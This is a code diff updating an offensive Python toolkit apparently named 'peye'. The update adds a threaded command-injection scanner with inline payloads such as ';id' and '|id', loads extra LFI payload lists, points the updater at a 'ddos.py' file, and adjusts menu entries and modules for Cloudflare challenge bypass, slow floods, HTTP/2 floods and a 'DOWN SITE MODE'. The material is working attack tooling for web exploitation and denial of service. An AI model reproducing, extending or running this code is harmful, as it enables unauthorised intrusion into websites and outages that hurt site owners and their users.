@@ -43,7 +43,7 @@ CYAN = '\033[96m'
 WHITE = '\033[97m'
 RESET = '\033[0m'
 
-VERSION = "19.0"
+VERSION = "19.1"
 
 def print_banner():
     banner = f"""
@@ -104,7 +104,7 @@ def print_banner():
 def check_update():
     print(f"{YELLOW}[*] Checking for updates...{RESET}")
     try:
-        response = requests.get("https://raw.githubusercontent.com/peye/peye/main/peye.py", timeout=10)
+        response = requests.get("https://raw.githubusercontent.com/peye/peye/main/ddos.py", timeout=10)
         if response.status_code == 200:
             content = response.text
             version_match = re.search(r'VERSION = "(\d+\.\d+)"', content)
@@ -155,23 +155,25 @@ class WordlistManager:
             'xslt': 'xslt.txt',
             'ssi_esi': 'ssi_esi.txt',
             'bypass403': 'bypass403.txt',
-            'bypass_waf': 'bypass_waf.txt',
             'dirs': 'dirs.txt',
             'subdomains': 'subdomains.txt',
-            'files': 'files.txt',
-            'parameters': 'parameters.txt',
-            'endpoints': 'endpoints.txt',
-            'dorks': 'dork.txt',
-            'useragents': 'useragent.txt',
-            'headers': 'headers.txt',
-            'payloads_64kb': 'payloads_64kb.txt',
-            'slow_body': 'slow_body.txt'
+            'dorks': 'dorks.txt',
+            'cmd': 'cmd.txt',
+            'useragents': 'useragent.txt'
         }
         
         for name, filename in wordlist_files.items():
             if os.path.exists(filename):
                 with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                     self.wordlists[name] = [l.strip() for l in f if l.strip() and not l.startswith('#')]
+
+                # Special case for LFI to load additional payloads
+                if name == 'lfi' and os.path.exists('LFI payloads.txt'):
+                    with open('LFI payloads.txt', 'r', encoding='utf-8', errors='ignore') as f2:
+                        lfi_extra = [l.strip() for l in f2 if l.strip() and not l.startswith('#')]
+                        self.wordlists[name].extend(lfi_extra)
+                        print(f"{GREEN}[✓] Loaded {len(lfi_extra)} additional LFI payloads from LFI payloads.txt{RESET}")
+
                 print(f"{GREEN}[✓] Loaded {len(self.wordlists[name])} {name} from {filename}{RESET}")
             else:
                 self.wordlists[name] = []
@@ -228,10 +230,10 @@ class DorkSearch:
         return self.results
     
     def search_from_file(self):
-        print(f"{CYAN}[*] Searching from dork.txt file...{RESET}")
+        print(f"{CYAN}[*] Searching from dorks.txt file...{RESET}")
         dorks = self.wordlists.get('dorks')
         if not dorks:
-            print(f"{RED}[!] No dorks found in dork.txt{RESET}")
+            print(f"{RED}[!] No dorks found in dorks.txt{RESET}")
             return []
         
         all_results = []
@@ -407,11 +409,11 @@ class JSModuleCaller:
     
     @staticmethod
     def run_cfbypass(target, cookie_count=5, timeout=60000):
-        """Cloudflare Challenge Bypass via cf-proo.js"""
+        """Cloudflare Challenge Bypass via cf-pro.js"""
         print(f"\n{CYAN}[*] Cloudflare Bypass | Target: {target}{RESET}")
         print(f"{YELLOW}[*] Cookie Count: {cookie_count} | Timeout: {timeout}ms{RESET}\n")
         
-        cmd = ['node', 'cf-proo.js', target, str(cookie_count), str(timeout)]
+        cmd = ['node', 'cf-pro.js', target, str(cookie_count), str(timeout)]
         return JSModuleCaller._run_js(cmd, timeout/1000)
     
     @staticmethod
@@ -463,6 +465,10 @@ class JSModuleCaller:
             print(f"{RED}[✗] Proxy file '{proxy_file}' not found!{RESET}")
             return False
         
+        if not os.path.exists('s-flood.js'):
+            print(f"{RED}[✗] JS file 's-flood.js' not found!{RESET}")
+            return False
+
         print(f"\n{RED}[!] SLOW FLOOD | Target: {target}{RESET}")
         print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads}{RESET}")
         print(f"{YELLOW}[*] Proxy File: {proxy_file}{RESET}\n")
@@ -782,6 +788,37 @@ class AdvancedScanner:
         except:
             return False, None
     
+    def cmd_injection_scan(self):
+        payloads = self.wordlists.get('cmd')
+        if not payloads:
+            payloads = [';id', '|id', '`id`']
+            print(f"{YELLOW}[!] No cmd.txt, using internal list{RESET}")
+        print(f"\n{CYAN}[*] Scanning CMD Injection... (Total: {len(payloads)}){RESET}")
+        found = []
+
+        def test_cmd(payload):
+            test_url = self.target + (('?' + 'cmd' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'cmd' + '=' + quote(payload)))
+            try:
+                resp = self.session.get(test_url, timeout=5)
+                if resp.status_code == 200 and ('uid=' in resp.text or 'groups=' in resp.text or 'root:' in resp.text):
+                    return (payload, test_url, resp.status_code)
+            except:
+                return None
+
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(test_cmd, p): p for p in payloads}
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    payload, url, code = result
+                    found.append(payload)
+                    self.report.add("CMD Injection", url, payload, f"HTTP {code}")
+                    print(f"\n{RED}[!] CMD INJECTION VULNERABLE!{RESET}")
+                    print(f"    {WHITE}URL:{RESET} {url}")
+                    print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
+        print(f"{GREEN}[✓] CMD Injection complete: {len(found)} found{RESET}")
+        return found
+
     def vuln_scan(self, vuln_type, payloads, param='q', indicator=None, method='GET'):
         if not payloads:
             print(f"{YELLOW}[!] No {vuln_type} payloads loaded{RESET}")
@@ -1151,6 +1188,7 @@ class AdvancedScanner:
         self.vuln_scan('SQLi', self.wordlists.get('sqli'), 'id', 'mysql|syntax')
         self.vuln_scan('LFI', self.wordlists.get('lfi'), 'file', 'root:')
         self.vuln_scan('XXE', self.wordlists.get('xxe'), 'xml', 'root:', method='POST')
+        self.cmd_injection_scan()
         self.bypass403_scan()
         self.ssti_scan()
         self.xslt_scan()
@@ -1256,13 +1294,13 @@ class Peye:
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[📊 SCANNER - VULNERABILITY]{RESET}{YELLOW}                                          ║
 ║ {CYAN}[1] {WHITE}Full Vulnerability Scan                                                     ║
-║ {CYAN}[2] {WHITE}XSS | SQLi | LFI | XXE | SSTI | XSLT | SSI/ESI                              ║
+║ {CYAN}[2] {WHITE}XSS | SQLi | LFI | CMD | XXE | SSTI | XSLT | SSI/ESI                        ║
 ║ {CYAN}[3] {WHITE}CSRF | CORS | Clickjacking | OpenDir | Backup | Config | .env               ║
 ║ {CYAN}[4] {WHITE}Directory Bruteforce | Subdomain | 403 Bypass                               ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[🔍 DORK SEARCH]{RESET}{YELLOW}                                                    ║
 ║ {CYAN}[5] {WHITE}Search with Google Dork                                                     ║
-║ {CYAN}[6] {WHITE}Search from dork.txt File                                                   ║
+║ {CYAN}[6] {WHITE}Search from dorks.txt File                                                  ║
 ║ {CYAN}[7] {WHITE}Search by Technology                                                        ║
 ║ {CYAN}[8] {WHITE}Show Popular Dorks                                                         ║
 ╠══════════════════════════════════════════════════════════════════╣
@@ -1281,9 +1319,10 @@ class Peye:
 ║ {CYAN}[21] {WHITE}TCP Flood               [22] {WHITE}Mixed Methods                               ║
 ║ {CYAN}[23] {WHITE}ALL ATTACKS             [24] {WHITE}DOWN SITE MODE                              ║
 ╠══════════════════════════════════════════════════════════════════╣
+╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[💥 DoS ATTACK - JS MODULES]{RESET}{YELLOW}                                                      ║
 ║ {CYAN}[25] {WHITE}HTTP/2 Flood (h2flood.js)                                                     ║
-║ {CYAN}[26] {WHITE}CF Bypass (cf-proo.js)                                                        ║
+║ {CYAN}[26] {WHITE}CF Bypass (cf-pro.js)                                                         ║
 ║ {CYAN}[27] {WHITE}UAM Flood (uam.js)                                                            ║
 ║ {CYAN}[28] {WHITE}HTTP/2 Attack (http2.js)                                                      ║
 ║ {CYAN}[29] {WHITE}Generic Flood (flood.js)                                                      ║
@@ -1360,6 +1399,7 @@ class Peye:
                     scanner.vuln_scan('XSS', scanner.wordlists.get('xss'), 'q', '<script>')
                     scanner.vuln_scan('SQLi', scanner.wordlists.get('sqli'), 'id', 'mysql|syntax')
                     scanner.vuln_scan('LFI', scanner.wordlists.get('lfi'), 'file', 'root:')
+                    scanner.cmd_injection_scan()
                     scanner.vuln_scan('XXE', scanner.wordlists.get('xxe'), 'xml', 'root:', method='POST')
                     scanner.ssti_scan()
                     scanner.xslt_scan()
